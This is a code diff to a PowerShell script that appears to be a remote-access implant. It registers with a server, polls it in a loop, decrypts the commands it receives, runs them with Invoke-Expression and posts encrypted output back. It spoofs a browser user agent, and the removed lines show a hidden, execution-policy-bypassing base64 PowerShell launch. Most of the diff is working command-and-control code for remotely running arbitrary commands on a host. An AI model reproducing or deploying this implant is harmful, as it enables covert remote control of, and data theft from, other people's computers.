@@ -1,4 +1,4 @@
-$SERVER_URL = "http://localhost/ReHTTP/"
+$SERVER_URL = "http://localhost"
 $UAG='Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0 Safari/534.6'
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls, [Net.SecurityProtocolType]::Tls11, [Net.SecurityProtocolType]::Tls12, [Net.SecurityProtocolType]::Ssl3
 [Net.ServicePointManager]::SecurityProtocol = "Tls, Tls11, Tls12, Ssl3"
@@ -61,9 +61,7 @@ function RunCommand {
     if ($inputStr -like "Terminate") {
         exit
     }
-    # $UnicodeEncoder = New-Object System.Text.UnicodeEncoding
-    # $EncodedPayloadScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($inputStr))
-    # return  powershell -exec bypass -Noninteractive -windowstyle hidden -e  $EncodedPayloadScript | Out-String
+
     return Invoke-Expression $inputStr | Out-String
 
 }
@@ -80,9 +78,8 @@ while ($true) {
         new_user = "ok"
     
     }
-    $URL = "$SERVER_URL"
  
-    Invoke-RestMethod  -Method 'Post' -Uri $URL  -Body  $PARAM -UserAgent $UAG
+    Invoke-RestMethod  -Method 'Post' -Uri $SERVER_URL  -Body  $PARAM -UserAgent $UAG
    
     while ($true) {
         $TIMER = Get-Random -SetSeed 100 -Maximum 1000
@@ -98,9 +95,8 @@ while ($true) {
             DATA = $CRYPT
             
         }
-        $URL = "$SERVER_URL"
          
-        $RESULT = Invoke-RestMethod  -Method 'Post' -Uri $URL  -Body  $PARAM  -UserAgent $UAG
+        $RESULT = Invoke-RestMethod  -Method 'Post' -Uri $SERVER_URL  -Body  $PARAM  -UserAgent $UAG
         $REQ = DcryptString($RESULT)
         if ($REQ -ne "wait") {
 
@@ -128,9 +124,8 @@ while ($true) {
                 DATA = $CRYPT
             
             }
-            $URL = "$SERVER_URL"
          
-            Invoke-RestMethod  -Method 'Post' -Uri $URL  -Body  $PARAM -UserAgent $UAG
+            Invoke-RestMethod  -Method 'Post' -Uri $SERVER_URL  -Body  $PARAM -UserAgent $UAG
             
             
         }
